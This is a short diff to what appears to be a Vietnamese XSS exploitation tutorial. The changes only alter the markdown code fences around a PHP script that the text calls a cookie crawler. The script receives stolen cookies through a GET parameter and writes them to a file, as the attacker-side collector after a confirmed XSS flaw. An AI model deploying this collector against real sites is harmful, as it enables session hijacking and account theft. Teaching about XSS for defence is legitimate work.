@@ -22,8 +22,7 @@ thực hiện tạo 1 popup thông báo để kiểm tra xem site có bị lỗi
 Vậy là đã chắc chắn web vulnerable với XSS, ta sẽ tiến hành khai thác bằng kỹ thuật đánh cắp cookie:
 
 Code php crawl cookie:
->
->
+'''php
 <?php
     if(isset($_GET['cookie']))
     {
@@ -38,6 +37,6 @@ Code php crawl cookie:
         fclose($f);
     }
 ?>
-
+'''
 
 
